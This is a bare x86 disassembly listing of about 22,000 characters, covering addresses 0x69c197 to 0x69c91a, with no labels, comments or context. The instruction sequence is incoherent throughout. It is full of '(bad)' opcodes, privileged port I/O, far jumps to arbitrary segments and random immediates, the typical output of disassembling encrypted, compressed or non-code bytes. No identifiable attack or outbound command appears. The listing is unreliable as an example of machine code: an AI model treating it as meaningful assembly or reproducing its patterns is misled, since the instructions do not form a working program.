  69c197:	mov    edx,0x23d5caaf
  69c19c:	sub    DWORD PTR [ebx+0x6c],ebx
  69c19f:	jne    0x69c1e4
  69c1a1:	in     eax,dx
  69c1a2:	xchg   edi,eax
  69c1a3:	aam    0xba
  69c1a5:	fdivr  QWORD PTR [ebx]
  69c1a7:	addr16 popa 
  69c1a9:	jne    0x69c1fb
  69c1ab:	test   DWORD PTR [ecx],edx
  69c1ad:	dec    ebp
  69c1ae:	shr    DWORD PTR ds:[edi],1
  69c1b1:	jmp    0x69c149
  69c1b3:	or     ah,BYTE PTR [ecx-0x31]
  69c1b6:	retf   
  69c1b7:	out    0xa2,al
  69c1b9:	dec    eax
  69c1ba:	jb     0x69c15f
  69c1bc:	scas   al,BYTE PTR es:[edi]
  69c1bd:	ficom  DWORD PTR [esi+0x304eed1b]
  69c1c3:	add    eax,0x260a5a94
  69c1c8:	sahf   
  69c1c9:	addr16 mov ah,0x85
  69c1cc:	xlat   BYTE PTR ds:[ebx]
  69c1cd:	or     edi,edi
  69c1cf:	dec    edi
  69c1d0:	loopne 0x69c16f
  69c1d2:	mov    ebp,0x89a357bf
  69c1d7:	sub    BYTE PTR [edi-0x44],cl
  69c1da:	(bad)  
  69c1db:	xor    ebp,DWORD PTR [esi+edi*8-0x2a96257f]
  69c1e2:	sahf   
  69c1e3:	sub    eax,0x2d11ae77
  69c1e8:	fisttp DWORD PTR [edi+0x36]
  69c1eb:	pop    ecx
  69c1ec:	xchg   esp,eax
  69c1ed:	and    esi,DWORD PTR ds:0xa1ae9520
  69c1f3:	ins    BYTE PTR es:[edi],dx
  69c1f4:	outs   dx,DWORD PTR ds:[esi]
  69c1f5:	sahf   
  69c1f6:	fsub   DWORD PTR [edi]
  69c1f8:	adc    DWORD PTR [ebx+0x185cd713],eax
  69c1fe:	jge    0x69c1b8
  69c200:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69c202:	out    dx,eax
  69c203:	outs   dx,BYTE PTR ds:[esi]
  69c204:	clc    
  69c205:	sti    
  69c206:	mov    bl,0x31
  69c208:	mov    WORD PTR [edx+0x31ab40b1],?
  69c20e:	jne    0x69c209
  69c210:	and    BYTE PTR [eax+ebx*1+0x53576ac5],al
  69c217:	push   esi
  69c218:	and    eax,0x35acdf16
  69c21d:	pusha  
  69c21e:	inc    esp
  69c21f:	and    dh,BYTE PTR [edi-0x4fabd326]
  69c225:	fptan  
  69c227:	mov    WORD PTR [ebp-0x35],ss
  69c22a:	cwde   
  69c22b:	lods   al,BYTE PTR ds:[esi]
  69c22c:	inc    edi
  69c22d:	jp     0x69c25b
  69c22f:	lods   eax,DWORD PTR ds:[esi]
  69c230:	lods   eax,DWORD PTR ds:[esi]
  69c231:	add    eax,0x58398b2a
  69c236:	retf   0xe75d
  69c239:	push   ebx
  69c23a:	imul   ebx,ecx,0x27100a68
  69c240:	sbb    eax,0x55bc4af7
  69c245:	and    esi,ebp
  69c247:	xchg   ecx,eax
  69c248:	pop    eax
  69c249:	adc    ch,BYTE PTR [ebp-0x1c]
  69c24c:	nop
  69c24d:	or     BYTE PTR ds:0x98b845f1,dh
  69c253:	les    esi,FWORD PTR [ebp-0x5b]
  69c256:	pusha  
  69c257:	sar    esi,cl
  69c259:	imul   eax,DWORD PTR [ebp-0x43],0xad66e541
  69c260:	mov    ebx,DWORD PTR [eax-0x54]
  69c263:	scas   al,BYTE PTR es:[edi]
  69c264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69c265:	mov    bh,0x23
  69c267:	dec    edi
  69c268:	int3   
  69c269:	xchg   BYTE PTR [edi+0x39ed8883],dl
  69c26f:	out    dx,al
  69c270:	bound  esp,QWORD PTR [esi]
  69c272:	mov    eax,ds:0x19cc60fe
  69c277:	into   
  69c278:	sub    cl,BYTE PTR [ecx-0x66]
  69c27b:	je     0x69c2e8
  69c27d:	pop    ds
  69c27e:	dec    edx
  69c27f:	repz test DWORD PTR [eax+eax*1],ebp
  69c283:	ds cld 
  69c285:	push   0xca736145
  69c28a:	inc    ebp
  69c28b:	add    DWORD PTR [ecx+0x5229f2ab],0xa7939c07
  69c295:	dec    esi
  69c296:	cmp    DWORD PTR [eax],edx
  69c298:	adc    DWORD PTR [ecx-0x1e1750f4],0x23795b75
  69c2a2:	mov    esp,0x1a871635
  69c2a7:	(bad)  
  69c2a8:	cmc    
  69c2a9:	imul   ebp,DWORD PTR gs:[edx-0x83cd5ee],0x34e20f44
  69c2b4:	or     DWORD PTR [ebp+0x430b98a9],eax
  69c2ba:	sbb    esp,DWORD PTR [ebx]
  69c2bc:	jb     0x69c283
  69c2be:	xchg   BYTE PTR [edx],dl
  69c2c0:	cld    
  69c2c1:	sbb    BYTE PTR [esi-0x41],bh
  69c2c4:	out    dx,al
  69c2c5:	mov    DWORD PTR [ebp+0x46097880],edi
  69c2cb:	icebp  
  69c2cc:	add    al,0x71
  69c2ce:	adc    cl,cl
  69c2d0:	mov    esp,0x1f57765d
  69c2d5:	push   ebx
  69c2d6:	cmp    ch,BYTE PTR [ebx-0x5ed3bc80]
  69c2dc:	pop    edx
  69c2dd:	mov    ecx,0x3ea3f5a9
  69c2e2:	jbe    0x69c2f0
  69c2e4:	imul   edi,edi,0x5
  69c2e7:	jae    0x69c2cc
  69c2e9:	mov    ecx,0x899a050
  69c2ee:	dec    edx
  69c2ef:	dec    eax
  69c2f0:	clc    
  69c2f1:	sahf   
  69c2f2:	scas   al,BYTE PTR es:[edi]
  69c2f3:	in     al,0xfa
  69c2f5:	lock cli 
  69c2f7:	sar    DWORD PTR [edx],1
  69c2f9:	or     dl,BYTE PTR [esi]
  69c2fb:	sbb    ebx,ebx
  69c2fd:	and    edx,edx
  69c2ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69c300:	inc    edx
  69c301:	daa    
  69c302:	and    DWORD PTR [ebp-0x3b876c2c],esp
  69c308:	fidivr DWORD PTR [edx+0x54]
  69c30b:	cmp    ebx,DWORD PTR [eax]
  69c30d:	inc    edi
  69c30e:	xchg   esi,eax
  69c30f:	dec    esi
  69c310:	int3   
  69c311:	ins    DWORD PTR es:[edi],dx
  69c312:	push   ebp
  69c313:	dec    esi
  69c314:	(bad)  
  69c315:	stc    
  69c316:	pop    edx
  69c317:	cli    
  69c318:	jmp    0xd74e:0x7350301e
  69c31f:	(bad)  
  69c320:	xchg   esi,eax
  69c321:	popf   
  69c322:	aas    
  69c323:	lds    esp,FWORD PTR [ecx-0x62]
  69c326:	mov    al,0x7f
  69c328:	add    ah,bh
  69c32a:	gs sbb edi,ebx
  69c32d:	sahf   
  69c32e:	(bad)  
  69c32f:	cmp    DWORD PTR [edx],esp
  69c331:	xchg   esp,eax
  69c332:	pop    edx
  69c333:	imul   ebp,DWORD PTR [edx],0xffffffa8
  69c336:	retf   
  69c337:	popf   
  69c338:	lahf   
  69c339:	mov    ch,0xf3
  69c33b:	aaa    
  69c33c:	jge    0x69c347
  69c33e:	inc    eax
  69c33f:	test   al,0x36
  69c341:	mov    bl,0x3
  69c343:	or     eax,edi
  69c345:	push   ecx
  69c346:	(bad)  
  69c347:	aad    0xe4
  69c349:	mov    eax,ds:0x32cfbb26
  69c34e:	in     al,0x11
  69c350:	jae    0x69c355
  69c352:	jge    0x69c32b
  69c354:	sbb    dh,0x59
  69c357:	retw   0x95b3
  69c35b:	mov    ebx,0xfacf94e
  69c360:	dec    ebx
  69c361:	sub    al,0xb1
  69c363:	jle    0x69c349
  69c365:	fimul  WORD PTR [edi]
  69c367:	inc    ebx
  69c368:	enter  0xf7f5,0xac
  69c36c:	lods   eax,DWORD PTR ds:[esi]
  69c36d:	dec    eax
  69c36e:	xor    eax,0xd9123efd
  69c373:	push   esi
  69c374:	aad    0xeb
  69c376:	jb     0x69c320
  69c378:	pop    ss
  69c379:	add    dh,al
  69c37b:	mov    dh,0x83
  69c37d:	rcr    edi,0xe0
  69c380:	xchg   DWORD PTR [esi],esp
  69c382:	scas   al,BYTE PTR es:[edi]
  69c383:	ret    0xe3e9
  69c386:	adc    BYTE PTR [ebp+0xa6b1cae],0x1f
  69c38d:	lock ja 0x69c3ab
  69c390:	lock loopne 0x69c367
  69c393:	sbb    ebx,ecx
  69c395:	xchg   edi,eax
  69c396:	xchg   DWORD PTR [edx],ebp
  69c398:	cmp    al,0xe8
  69c39a:	inc    ebx
  69c39b:	mov    al,0xf0
  69c39d:	push   ss
  69c39e:	cwde   
  69c39f:	push   eax
  69c3a0:	or     DWORD PTR [edx-0x1e],0xc14f579
  69c3a7:	mov    bh,0x55
  69c3a9:	(bad)  
  69c3aa:	adc    DWORD PTR [esi],esi
  69c3ac:	(bad)
  69c3af:	inc    esp
  69c3b0:	mov    edx,0x858034f3
  69c3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69c3b6:	(bad)  
  69c3b7:	mov    al,ds:0x8fddc039
  69c3bc:	std    
  69c3bd:	mov    ah,0x53
  69c3bf:	pusha  
  69c3c0:	into   
  69c3c1:	fcomp  QWORD PTR [esi+0x18]
  69c3c4:	mov    eax,ds:0x26331afb
  69c3c9:	adc    al,0x2d
  69c3cb:	adc    DWORD PTR [ecx],ebp
  69c3cd:	push   cs
  69c3ce:	mov    edx,0xdb70c215
  69c3d3:	call   0x7edd6af6
  69c3d8:	sahf   
  69c3d9:	mov    DWORD PTR [ebx-0x50],ecx
  69c3dc:	and    esp,ecx
  69c3de:	pop    ecx
  69c3df:	xor    DWORD PTR ds:0xe1c36210,edx
  69c3e5:	sbb    edi,ebx
  69c3e7:	in     al,dx
  69c3e8:	in     al,0x9d
  69c3ea:	push   ebp
  69c3eb:	push   cs
  69c3ec:	(bad)  
  69c3ed:	jmp    0xb6f9:0x8fae69ac
  69c3f4:	cmp    al,0x5b
  69c3f6:	das    
  69c3f7:	out    0x25,eax
  69c3f9:	mov    ebp,0x30268114
  69c3fe:	test   eax,edx
  69c400:	mov    al,ds:0x69ab1f65
  69c405:	dec    ebx
  69c406:	inc    edi
  69c407:	adc    dl,BYTE PTR [esi+0x55]
  69c40a:	or     eax,0x49cebbec
  69c40f:	or     bl,BYTE PTR [edx+0x7268bd42]
  69c415:	out    0x88,eax
  69c417:	das    
  69c418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69c419:	inc    BYTE PTR [ebp-0xbd9cf51]
  69c41f:	imul   edi,DWORD PTR [esp+esi*8],0x23
  69c423:	into   
  69c424:	mov    gs:0x36b5d08f,al
  69c42a:	(bad)  
  69c42b:	data16 mov bl,0xa7
  69c42e:	dec    ebx
  69c42f:	in     eax,0x91
  69c431:	loopne 0x69c403
  69c433:	sbb    dl,0xa
  69c436:	call   FWORD PTR [eax]
  69c438:	push   cs
  69c439:	imul   ebp,DWORD PTR [ecx-0x5f],0xbb441291
  69c440:	mov    ch,0xa7
  69c442:	xor    ch,BYTE PTR [esi]
  69c444:	out    dx,al
  69c445:	push   es
  69c446:	xor    al,0x4b
  69c448:	xor    al,0xc5
  69c44a:	add    BYTE PTR [ecx+eiz*1],ch
  69c44d:	addr16 push esp
  69c44f:	adc    eax,0xc00aabf9
  69c454:	sub    DWORD PTR [esi-0x44015c73],esp
  69c45a:	mov    edi,0x730ae07e
  69c45f:	jbe    0x69c491
  69c461:	call   0x6e3135fb
  69c466:	je     0x69c493
  69c468:	add    BYTE PTR [edx+ebp*8],0x23
  69c46c:	sub    al,0xab
  69c46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69c46f:	stos   BYTE PTR es:[edi],al
  69c470:	pop    edx
  69c471:	push   edx
  69c472:	xchg   esi,eax
  69c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69c474:	jge    0x69c490
  69c476:	imul   esi,DWORD PTR [ebx+0x76],0xd651b03f
  69c47d:	add    al,0x55
  69c47f:	lods   eax,DWORD PTR ds:[esi]
  69c480:	ins    BYTE PTR es:[edi],dx
  69c481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69c482:	test   eax,0xee538061
  69c487:	pop    eax
  69c488:	enter  0xd9cf,0x72
  69c48c:	add    dl,dl
  69c48e:	sbb    eax,0x3b55ace1
  69c493:	inc    esp
  69c494:	adc    al,0x34
  69c496:	add    BYTE PTR [eax],al
  69c498:	retf   0x8fbc
  69c49b:	xchg   ebp,eax
  69c49c:	sbb    DWORD PTR [eax+0x69],edi
  69c49f:	int3   
  69c4a0:	pop    eax
  69c4a1:	xchg   esi,eax
  69c4a2:	push   esi
  69c4a3:	push   ds
  69c4a4:	xor    eax,0xf3b34e6
  69c4a9:	sub    DWORD PTR [esi+0x6a],0x8bbbb2e
  69c4b0:	out    0x49,eax
  69c4b2:	mov    edx,0xcd5bef65
  69c4b7:	or     ah,0x31
  69c4ba:	scas   eax,DWORD PTR es:[edi]
  69c4bb:	imul   ecx,ebx,0x6d
  69c4be:	push   es
  69c4bf:	xor    al,0x69
  69c4c1:	pop    ecx
  69c4c2:	fld    QWORD PTR [ebx+edx*4]
  69c4c5:	mov    cl,0xf4
  69c4c7:	cdq    
  69c4c8:	stc    
  69c4c9:	jl     0x69c4cd
  69c4cb:	pop    es
  69c4cc:	stc    
  69c4cd:	int    0xd9
  69c4cf:	sbb    eax,0x4108e71f
  69c4d4:	push   ebx
  69c4d5:	es jb  0x69c4ae
  69c4d8:	lods   al,BYTE PTR gs:[esi]
  69c4da:	ins    BYTE PTR es:[edi],dx
  69c4db:	adc    BYTE PTR [eax+0x50a957aa],ah
  69c4e1:	les    ebp,FWORD PTR [edi-0x276bbac7]
  69c4e7:	jbe    0x69c520
  69c4e9:	push   es
  69c4ea:	xchg   ebp,eax
  69c4eb:	retf   
  69c4ec:	bsf    edx,ebx
  69c4ef:	fadd   st(0),st
  69c4f1:	cwde   
  69c4f2:	ret    0xf4ab
  69c4f5:	sti    
  69c4f6:	mov    DWORD PTR [ecx+0x63],ecx
  69c4f9:	xchg   edx,eax
  69c4fa:	pusha  
  69c4fb:	outs   dx,BYTE PTR ds:[esi]
  69c4fc:	scas   eax,DWORD PTR es:[edi]
  69c4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69c4fe:	test   DWORD PTR [ebp+eax*8+0xa],0x78ad06d0
  69c506:	sbb    bl,ah
  69c508:	mov    ebx,0x82a7a6f6
  69c50d:	xor    al,0x78
  69c50f:	imul   ecx,DWORD PTR [ecx+0x2c37456a],0x3f26102c
  69c519:	cmc    
  69c51a:	es int 0x9c
  69c51d:	jge    0x69c506
  69c51f:	cli    
  69c520:	and    dh,BYTE PTR [ecx]
  69c522:	aas    
  69c523:	push   ebx
  69c524:	xchg   esp,eax
  69c525:	loop   0x69c4f1
  69c527:	pop    ebp
  69c528:	pop    es
  69c529:	inc    ebp
  69c52a:	mov    esi,0x4eb90814
  69c52f:	add    ecx,DWORD PTR [ebp-0x3ffbc045]
  69c535:	in     al,0x8b
  69c537:	xchg   esp,ebx
  69c539:	jns    0x69c51a
  69c53b:	mov    bl,0x7c
  69c53d:	pop    es
  69c53e:	push   ss
  69c53f:	xor    ebp,DWORD PTR [edi+0x3e8e130f]
  69c545:	inc    esp
  69c546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69c547:	loopne 0x69c4e8
  69c549:	rol    ebp,0x2d
  69c54c:	mov    cl,0x5b
  69c54e:	out    dx,eax
  69c54f:	pop    ss
  69c550:	js     0x69c59a
  69c552:	ret    0x9fc4
  69c555:	pop    edx
  69c556:	loopne 0x69c4f3
  69c558:	addr16 fs jmp 0x69c54f
  69c55c:	in     eax,0x1d
  69c55e:	scas   eax,DWORD PTR es:[edi]
  69c55f:	and    ebp,0xffffffc5
  69c562:	cmp    eax,0x9efab477
  69c567:	ja     0x69c577
  69c569:	enter  0x5bb8,0xa6
  69c56d:	cmp    ch,BYTE PTR [eax+0x1d5e867b]
  69c573:	inc    edx
  69c574:	les    ecx,FWORD PTR [ebx+esi*4-0x2d]
  69c578:	je     0x69c590
  69c57a:	add    al,0x97
  69c57c:	mov    esi,0xaa504ccc
  69c581:	aas    
  69c582:	jmp    0x69c5de
  69c584:	sbb    BYTE PTR ds:0xdd9c5b0c,0xd8
  69c58b:	sar    ebp,0x13
  69c58e:	out    0x87,eax
  69c590:	push   edi
  69c591:	and    ch,BYTE PTR [esi+0x4e60cc8a]
  69c597:	pop    esi
  69c598:	add    eax,0x55abec2a
  69c59d:	sub    al,0x7
  69c59f:	retf   0x89fd
  69c5a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69c5a3:	sub    bh,BYTE PTR [eax-0xd]
  69c5a6:	mov    bh,0xa0
  69c5a8:	mov    WORD PTR [ecx-0x8],?
  69c5ab:	sub    eax,0x49be8695
  69c5b0:	sub    ebx,ecx
  69c5b2:	dec    edx
  69c5b3:	outs   dx,BYTE PTR ds:[esi]
  69c5b4:	pop    edx
  69c5b5:	test   eax,0x45780f7
  69c5ba:	retf   0x4197
  69c5bd:	inc    edx
  69c5be:	(bad)  
  69c5bf:	sub    eax,0x6a87ae99
  69c5c4:	inc    ebx
  69c5c5:	int    0x36
  69c5c7:	ret    
  69c5c8:	sub    eax,0xd2bda4b4
  69c5cd:	scas   al,BYTE PTR es:[edi]
  69c5ce:	shl    BYTE PTR [ebp-0x6e6680ba],0x68
  69c5d5:	sti    
  69c5d6:	push   edi
  69c5d7:	lahf   
  69c5d8:	call   0x6b0:0x47f7f3fe
  69c5df:	adc    DWORD PTR [edx],esi
  69c5e1:	jo     0x69c597
  69c5e3:	or     cl,bh
  69c5e5:	xchg   esp,eax
  69c5e6:	sub    BYTE PTR [edx+0x28],ch
  69c5e9:	stos   DWORD PTR es:[edi],eax
  69c5ea:	aaa    
  69c5eb:	(bad)  
  69c5ec:	retf   0xe158
  69c5ef:	push   edi
  69c5f0:	pushf  
  69c5f1:	imul   esp,esp,0xffffffb3
  69c5f4:	(bad)  
  69c5f5:	mov    ebx,0x9521d309
  69c5fa:	jns    0x69c580
  69c5fc:	adc    esp,esi
  69c5fe:	xor    eax,0xe232e08f
  69c603:	mov    al,ds:0xd248f840
  69c608:	pop    ds
  69c609:	aas    
  69c60a:	repnz cli 
  69c60c:	sbb    ah,ah
  69c60e:	add    ah,BYTE PTR [ecx]
  69c610:	sub    esi,eax
  69c612:	test   BYTE PTR [ebx+0x67bb7b68],al
  69c618:	stc    
  69c619:	ins    DWORD PTR es:[edi],dx
  69c61a:	outs   dx,DWORD PTR ds:[esi]
  69c61b:	sti    
  69c61c:	mov    fs,ecx
  69c61e:	mov    dl,BYTE PTR [ecx+esi*2+0x3e83b09b]
  69c625:	ret    0xa9fd
  69c628:	add    BYTE PTR [edi+ebx*8-0x6b771b8c],0x83
  69c630:	ret    
  69c631:	inc    esi
  69c632:	jb     0x69c5be
  69c634:	cli    
  69c635:	sbb    DWORD PTR [edx+0x7f340e6f],esp
  69c63b:	jb     0x69c635
  69c63d:	or     BYTE PTR [ecx],0x1d
  69c640:	xchg   DWORD PTR [eax-0x48af9ea5],ebp
  69c646:	cmp    BYTE PTR [edi],0xaf
  69c649:	sub    eax,0x3be4d051
  69c64e:	rcl    BYTE PTR [ecx+0x50],0x5b
  69c652:	fadd   QWORD PTR [ecx-0x22b47ad9]
  69c658:	ror    ah,cl
  69c65a:	jle    0x69c677
  69c65c:	mov    dl,0xd
  69c65e:	jp     0x69c65d
  69c660:	mov    ds:0x34b60473,eax
  69c665:	xchg   ecx,eax
  69c666:	push   edi
  69c667:	pop    ecx
  69c668:	push   0xffffffa1
  69c66a:	es cmp eax,0xabc84cc9
  69c670:	xlat   BYTE PTR ds:[ebx]
  69c672:	cmp    eax,0x627dc340
  69c677:	bound  edi,QWORD PTR [edi+0x5df9116b]
  69c67d:	inc    eax
  69c67e:	or     ah,BYTE PTR [esi]
  69c680:	add    al,0x77
  69c682:	dec    eax
  69c683:	cwde   
  69c684:	add    esp,DWORD PTR [edi-0x4626a212]
  69c68a:	fadd   st(1),st
  69c68c:	mov    eax,ds:0x5bdfc6b2
  69c691:	scas   al,BYTE PTR es:[edi]
  69c692:	push   0x63
  69c694:	xor    eax,0xe03b95da
  69c699:	or     ch,BYTE PTR [esi-0x36]
  69c69c:	mov    esp,DWORD PTR [esi-0x2a]
  69c69f:	lods   eax,DWORD PTR ds:[esi]
  69c6a0:	pop    ebp
  69c6a1:	pop    edx
  69c6a2:	scas   al,BYTE PTR es:[edi]
  69c6a3:	or     al,0xc5
  69c6a5:	mov    WORD PTR [eax+0x4f],?
  69c6a8:	inc    ebx
  69c6a9:	mov    eax,0x943b5df1
  69c6ae:	push   ecx
  69c6af:	pop    edx
  69c6b0:	xchg   cl,cl
  69c6b2:	loope  0x69c733
  69c6b4:	rol    dl,0x16
  69c6b7:	adc    BYTE PTR [edi],0x67
  69c6ba:	jo     0x69c69f
  69c6bc:	enter  0x853,0x2a
  69c6c0:	pusha  
  69c6c1:	mov    cs,WORD PTR [ebx]
  69c6c3:	loopne 0x69c708
  69c6c5:	sbb    ch,cl
  69c6c7:	xor    BYTE PTR [eax-0x62],0xa5
  69c6cb:	or     al,0x9f
  69c6cd:	test   DWORD PTR [ebx+0x1e],edi
  69c6d0:	xchg   ecx,eax
  69c6d1:	push   0xa9b3d587
  69c6d6:	mov    ebp,0xe9a61285
  69c6db:	stos   BYTE PTR es:[edi],al
  69c6dc:	loope  0x69c702
  69c6de:	shl    BYTE PTR [eax+0x70],1
  69c6e1:	xchg   BYTE PTR [esp+ecx*4],al
  69c6e4:	cmp    edi,0xcfd386fc
  69c6ea:	push   0x355057df
  69c6ef:	bound  ebp,QWORD PTR [ebx-0xc86e291]
  69c6f5:	pop    esi
  69c6f6:	inc    edx
  69c6f7:	mov    esi,ebp
  69c6f9:	and    cl,bl
  69c6fb:	aaa    
  69c6fc:	jecxz  0x69c71a
  69c6fe:	fist   WORD PTR [ebx-0x5a]
  69c701:	ss adc eax,0x15fb1f4d
  69c707:	push   esi
  69c708:	push   esi
  69c709:	xchg   esi,eax
  69c70a:	mov    eax,0x5ca9a5d2
  69c70f:	or     BYTE PTR [esi-0x67d6b360],0xdd
  69c716:	lahf   
  69c717:	sahf   
  69c718:	xor    BYTE PTR [edi-0xb6f03d8],dl
  69c71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69c71f:	sbb    dh,bl
  69c721:	sub    bh,BYTE PTR [ecx]
  69c723:	stos   BYTE PTR es:[edi],al
  69c724:	imul   ecx,DWORD PTR [edi-0x3845b7aa],0x1f3f7682
  69c72e:	add    al,0xf0
  69c730:	dec    esi
  69c731:	out    dx,eax
  69c732:	adc    ch,BYTE PTR [esi+0x1ba7f8bd]
  69c738:	and    al,0x77
  69c73a:	and    BYTE PTR [ebp-0x4e],0xa9
  69c73e:	pop    ss
  69c73f:	lock sub bh,BYTE PTR [ebp-0x31754120]
  69c746:	inc    esp
  69c747:	or     edx,edi
  69c749:	inc    eax
  69c74a:	jnp    0x69c6e3
  69c74c:	mov    esp,0x38d903f6
  69c751:	inc    esi
  69c752:	push   ecx
  69c753:	icebp  
  69c754:	lock loopne 0x69c77b
  69c757:	mov    dl,0xba
  69c759:	cmp    eax,0xfc13ea17
  69c75e:	mov    esi,0xd3c5b333
  69c763:	je     0x69c701
  69c765:	out    0x99,eax
  69c767:	mov    al,ds:0x5b104aff
  69c76c:	imul   esp,DWORD PTR es:[eax-0x39],0xd9d6d1ad
  69c774:	mov    dh,0x92
  69c776:	push   es
  69c777:	inc    edx
  69c778:	imul   esi,DWORD PTR ds:0x619b7fdb,0xffffffb1
  69c77f:	ret    0x1890
  69c782:	test   DWORD PTR [ebp+0x68],esi
  69c785:	repnz inc esp
  69c787:	dec    BYTE PTR [eax-0x4e1f726a]
  69c78d:	fidivr DWORD PTR [eax-0x3f]
  69c790:	inc    eax
  69c791:	aad    0x36
  69c793:	xchg   edx,eax
  69c794:	mul    BYTE PTR ss:[esi+edi*8]
  69c798:	cwde   
  69c799:	enter  0x2397,0x7
  69c79d:	and    BYTE PTR [edi-0x3d],cl
  69c7a0:	test   BYTE PTR [edi+0x1ae1416e],dl
  69c7a6:	sub    bh,bh
  69c7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69c7a9:	outs   dx,DWORD PTR ds:[esi]
  69c7aa:	je     0x69c7f1
  69c7ac:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  69c7ae:	sub    ebp,DWORD PTR [edi-0x1b]
  69c7b1:	and    esp,DWORD PTR [esi-0x1712101f]
  69c7b7:	es pop ebx
  69c7b9:	xchg   edx,eax
  69c7ba:	lds    ebx,FWORD PTR [edi-0x4]
  69c7bd:	or     edi,DWORD PTR [edx+0x10ef97d6]
  69c7c3:	or     esi,DWORD PTR [edi+eiz*4-0x5d0c7453]
  69c7ca:	lahf   
  69c7cb:	inc    eax
  69c7cc:	(bad)  
  69c7cd:	aas    
  69c7ce:	hlt    
  69c7cf:	inc    eax
  69c7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69c7d1:	push   esp
  69c7d2:	sbb    eax,0x2a2a151
  69c7d7:	cmc    
  69c7d8:	or     al,BYTE PTR fs:[esi]
  69c7db:	out    0x75,al
  69c7dd:	jl     0x69c7ac
  69c7df:	call   0xab16:0x585962a3
  69c7e6:	out    0x4e,eax
  69c7e8:	cwde   
  69c7e9:	int3   
  69c7ea:	sbb    edi,DWORD PTR [ebp+0x780670d5]
  69c7f0:	jae    0x69c772
  69c7f2:	jg     0x69c830
  69c7f4:	dec    edi
  69c7f5:	xor    eax,DWORD PTR ds:0xc867c930
  69c7fb:	and    BYTE PTR [edx+0xfc3ff71],0x2
  69c802:	pushf  
  69c803:	sbb    eax,0xbbfe898a
  69c808:	(bad)  
  69c809:	sub    ah,BYTE PTR [edi+0x5a]
  69c80c:	add    BYTE PTR [ebp+0x5c],bh
  69c80f:	out    dx,al
  69c810:	je     0x69c7f6
  69c812:	retf   0x2017
  69c815:	pop    edx
  69c816:	test   eax,0x8bd82cf
  69c81b:	sbb    al,0x94
  69c81d:	fsub   st(2),st
  69c81f:	sar    DWORD PTR ds:0x62b02157,cl
  69c825:	jno    0x69c82f
  69c827:	sub    eax,0x5fac70df
  69c82c:	(bad)  
  69c82d:	fsubr  QWORD PTR [ebx+0x44]
  69c830:	(bad)  
  69c831:	lahf   
  69c832:	cs jnp 0x69c85a
  69c835:	xor    BYTE PTR [esi],cl
  69c837:	int    0x68
  69c839:	jbe    0x69c8af
  69c83b:	ins    DWORD PTR es:[edi],dx
  69c83c:	jne    0x69c88b
  69c83e:	mov    dl,0x39
  69c840:	mov    eax,0xf1bf56ac
  69c845:	push   ecx
  69c846:	and    DWORD PTR [eax],edi
  69c848:	add    al,0x68
  69c84a:	xchg   ebp,eax
  69c84b:	dec    ebx
  69c84c:	std    
  69c84d:	pop    ebp
  69c84e:	add    al,0x45
  69c850:	add    eax,0x39306100
  69c855:	adc    bl,bh
  69c857:	fnsave [eax+0xe]
  69c85a:	mov    ds:0x7fd136ca,eax
  69c85f:	add    al,bh
  69c861:	xlat   BYTE PTR ds:[ebx]
  69c862:	sbb    al,0x61
  69c864:	sbb    esi,DWORD PTR [ebx+0x43cfe49d]
  69c86a:	sti    
  69c86b:	sub    bh,BYTE PTR [ebp+0x19b953b0]
  69c871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69c872:	stc    
  69c873:	lods   eax,DWORD PTR ds:[esi]
  69c874:	jp     0x69c806
  69c876:	(bad)  
  69c877:	jae    0x69c882
  69c879:	pop    ecx
  69c87a:	and    BYTE PTR ds:0x45a37469,0x10
  69c881:	(bad)  
  69c882:	jl     0x69c8e6
  69c884:	jbe    0x69c8b2
  69c886:	mov    dh,0xcd
  69c888:	ins    BYTE PTR es:[edi],dx
  69c889:	mov    ds:0x4a219734,al
  69c88e:	xchg   esi,eax
  69c88f:	mov    esi,0x5ea851d9
  69c894:	mov    al,ds:0x8a6dc565
  69c899:	cwde   
  69c89a:	mov    cl,0x96
  69c89c:	pusha  
  69c89d:	dec    edi
  69c89e:	jmp    0xa168:0xc28a89b1
  69c8a5:	add    esp,DWORD PTR [ebx]
  69c8a7:	or     eax,0x6c184717
  69c8ac:	fstp   QWORD PTR [eax-0x57515617]
  69c8b2:	mov    edx,0xc9fdb6b0
  69c8b7:	fwait
  69c8b8:	sub    al,0x77
  69c8ba:	inc    esi
  69c8bb:	jge    0x69c855
  69c8bd:	imul   edi,DWORD PTR [esi+edi*4],0x43
  69c8c1:	lds    esp,FWORD PTR [edi-0x4a239973]
  69c8c7:	push   esp
  69c8c8:	ds or  eax,0x88cbd941
  69c8ce:	pop    edx
  69c8cf:	sbb    eax,esi
  69c8d1:	cmp    DWORD PTR [edx*2+0x46c4e7de],edx
  69c8d8:	add    eax,0xab4327fa
  69c8dd:	aad    0x51
  69c8df:	les    edi,FWORD PTR [ebp+0x73]
  69c8e2:	push   ds
  69c8e3:	neg    BYTE PTR [eax-0x66460729]
  69c8e9:	dec    ebp
  69c8ea:	sub    dh,BYTE PTR [ebx-0x26]
  69c8ed:	clc    
  69c8ee:	cmp    DWORD PTR [ecx-0x5e693103],ecx
  69c8f4:	xchg   edx,eax
  69c8f5:	adc    BYTE PTR [esi+0x2c],bh
  69c8f8:	ror    DWORD PTR [ebx-0x74c7aa91],1
  69c8fe:	mov    cs,WORD PTR [edx-0x1d0c9d58]
  69c904:	mov    WORD PTR [esi],es
  69c906:	jge    0x69c88f
  69c908:	jnp    0x69c8bb
  69c90a:	cs inc ebp
  69c90c:	imul   ebp,DWORD PTR [ebx+ecx*2+0x512ee006],0x4aec14ee
  69c917:	or     dh,BYTE PTR [ebp-0x64]
  69c91a:	loope  0x69c94e
